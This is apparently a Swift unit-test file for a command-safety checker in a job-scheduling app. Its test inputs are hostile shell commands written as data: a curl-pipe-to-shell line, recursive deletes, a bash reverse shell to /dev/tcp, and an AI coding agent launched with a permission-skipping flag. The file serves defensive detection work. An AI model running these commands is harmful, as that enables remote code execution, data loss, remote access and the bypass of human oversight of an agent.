import XCTest
@testable import JobWatch

final class CommandSafetyTests: XCTestCase {

    func testSafeCommandsHaveNoWarnings() {
        XCTAssertFalse(CommandSafety.isRisky("date >> ~/tmp/ping.log"))
        XCTAssertFalse(CommandSafety.isRisky("/bin/bash ~/scripts/backup.sh"))
        XCTAssertFalse(CommandSafety.isRisky("pnpm build"))
    }

    func testDetectsSudo() {
        XCTAssertTrue(CommandSafety.isRisky("sudo rm /var/log/x"))
    }

    func testDetectsRecursiveDelete() {
        XCTAssertTrue(CommandSafety.isRisky("rm -rf ~/Downloads/tmp"))
    }

    func testDetectsCurlPipeToShell() {
        let w = CommandSafety.warnings(for: "curl https://x.sh | sh")
        XCTAssertTrue(w.contains { $0.reason == "danger.pipeToShell" })
    }

    func testDetectsPermissionBypass() {
        XCTAssertTrue(CommandSafety.isRisky("claude --dangerously-skip-permissions -p hi"))
    }

    func testDetectsReverseShell() {
        XCTAssertTrue(CommandSafety.isRisky("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"))
    }

    func testWarningsAreDeduped() {
        // 같은 사유는 한 번만
        let w = CommandSafety.warnings(for: "sudo sudo something")
        XCTAssertEqual(w.filter { $0.reason == "danger.sudo" }.count, 1)
    }
}
